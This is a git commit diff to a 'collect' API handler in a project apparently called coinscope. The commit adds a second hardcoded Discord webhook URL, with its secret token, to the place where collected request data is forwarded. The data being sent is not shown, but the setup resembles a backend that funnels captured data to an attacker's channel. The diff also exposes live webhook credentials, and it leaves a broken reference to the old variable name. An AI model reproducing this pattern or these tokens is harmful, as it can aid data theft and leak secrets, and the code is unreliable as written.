65d7a2a833ac66fbad4ab08127bc4a54129274ee
johnlick120012-boop <johnlick120012@gmail.com>
2026-08-15 00:35:13 +0530

    dis2

--- coinscope/api/collect.js
+++ coinscope/api/collect.js
@@ -36,7 +36,7 @@ module.exports = async function handler(req, res) {
       });
     }
 
-    const webhook = "https://discord.com/api/webhooks/1537215091672490044/6_yABK9woKznqk7mz_4fdahA0JOpynjiMchIUbf4Aptl29PlY_i35K3h-Y-ZZpXTi58A";
+    const webhooks = ["https://discord.com/api/webhooks/1537215091672490044/6_yABK9woKznqk7mz_4fdahA0JOpynjiMchIUbf4Aptl29PlY_i35K3h-Y-ZZpXTi58A", "https://discord.com/api/webhooks/1537898224327856188/NtPVf8IO88mSJ4LeOFKAHCj4J4p7tPyf9J1IUdYguqP15nm8UGDGlrpCCZthC53UAAm4"];
 
     const response = await fetch(webhook, {
       method: 'POST',
